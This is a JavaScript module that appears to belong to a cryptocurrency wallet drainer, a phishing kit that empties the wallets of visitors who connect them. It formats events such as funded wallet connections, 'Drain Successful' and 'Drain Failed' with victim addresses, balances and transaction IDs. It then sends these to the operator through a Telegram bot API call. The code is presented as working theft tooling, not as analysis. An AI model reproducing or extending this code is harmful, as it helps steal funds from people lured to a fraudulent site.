export const sendTelegramLog = async (event, data) => {
  try {
    const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
    
    if (!botToken || !chatId) return;
    
    const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(-4)}` : 'unknown';
    const formatNumber = (num) => typeof num === 'number' ? num.toFixed(4) : num;
    
    let message = '';
    
    switch(event) {
      case 'connected_empty':
        message = `🟡 Wallet Connected (Empty)
Wallet: ${formatAddress(data.address)}
Type: ${data.walletType}
Balance: ${formatNumber(data.balance)} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'connected_funded':
        message = `🟢 Wallet Connected (Funded)
Wallet: ${formatAddress(data.address)}
Type: ${data.walletType}
Balance: ${formatNumber(data.balance)} ${data.walletType === 'phantom' ? 'SOL' : 'ETH'}
Eligible: ${data.eligibleAmount} SOL
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'drain_success':
        message = `💰 Drain Successful
Wallet: ${formatAddress(data.address)}
Amount: ${data.amount} SOL
TX: ${data.tx?.slice(0,8)}...
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'drain_failed':
        message = `❌ Drain Failed
Wallet: ${formatAddress(data.address)}
Error: ${data.error}
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'connection_error':
        message = `⚠️ Connection Error
Type: ${data.walletType}
Error: ${data.error}
Time: ${new Date().toLocaleTimeString()}`;
        break;
        
      default:
        message = `📊 ${event}\n${JSON.stringify(data, null, 2)}`;
    }
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
  } catch (error) {
    console.error('Telegram logging failed:', error);
  }
};
